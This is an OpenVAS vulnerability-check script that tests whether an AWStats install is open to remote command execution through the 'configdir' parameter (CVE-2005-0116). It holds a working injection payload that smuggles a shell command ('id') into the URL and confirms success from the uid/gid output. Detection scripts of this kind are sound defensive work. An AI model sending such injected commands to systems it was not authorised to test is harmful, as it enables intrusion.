###############################################################################
# OpenVAS Vulnerability Test
# $Id: awstats_configdir.nasl 9788 2018-05-09 15:53:43Z cfischer $
#
# AWStats configdir parameter arbitrary cmd exec
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:awstats:awstats";

# Ref: iDEFENSE
# changes by rd: changed the web reqeuest

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16189");
  script_version("$Revision: 9788 $");
  script_cve_id("CVE-2005-0116");
  script_bugtraq_id(12270, 12298);
  script_tag(name:"last_modification", value:"$Date: 2018-05-09 17:53:43 +0200 (Wed, 09 May 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("AWStats configdir parameter arbitrary cmd exec");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("awstats_detect.nasl");
  script_mandatory_keys("awstats/installed");

  script_tag(name:"summary", value:"The remote host is running AWStats, a free real-time logfile analyzer.

  The remote version of this software is prone to an input validation
  vulnerability.

  The issue is reported to exist because user supplied 'configdir' URI data passed
  to the 'awstats.pl' script is not sanitized.");

  script_tag(name:"impact", value:"An attacker may exploit this condition to execute commands remotely or disclose
  contents of web server readable files.");

  script_tag(name:"solution", value:"Upgrade at least to version 6.3 of this software.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

http_check_remote_code (
                        unique_dir:dir,
                        extra_check:"Check config file, permissions and AWStats documentation",
                        check_request:"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id",
                        port:port
                        );

exit( 99 );
